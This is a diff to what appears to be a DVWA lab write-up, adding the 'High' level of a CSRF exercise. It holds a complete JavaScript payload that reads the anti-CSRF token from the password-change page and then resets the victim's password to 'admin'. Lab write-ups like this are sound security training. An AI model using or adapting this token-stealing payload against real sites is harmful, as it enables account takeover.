@@ -42,3 +42,37 @@
 
 <!-- medium -->
 ```
+
+## High
+- For high there was anti-csrf token implemented by dev.
+- what we did here was similar to our anti-csrf brute forcing, we created a javascript file which would grab a csrf token for us by requresting the password change page and then use that token to send another request to change the password.
+
+```
+var theUrl = 'http://192.168.0.106/dvwa/vulnerabilities/csrf/';
+var pass = 'admin';
+if (window.XMLHttpRequest){
+    xmlhttp=new XMLHttpRequest();
+}else{
+    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+}
+xmlhttp.withCredentials = true;
+var hacked = false;
+xmlhttp.onreadystatechange=function(){
+    if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+        var text = xmlhttp.responseText;
+        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
+        var match = text.match(regex);
+        var token = match[1];
+        var new_url = 'http://192.168.0.106/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
+        if(!hacked){
+            alert('Got token:' + match[1]);
+            hacked = true;
+            xmlhttp.open("GET", new_url, false );
+            xmlhttp.send();  
+        }
+    }
+};
+xmlhttp.open("GET", theUrl, false );
+xmlhttp.send();  
+```
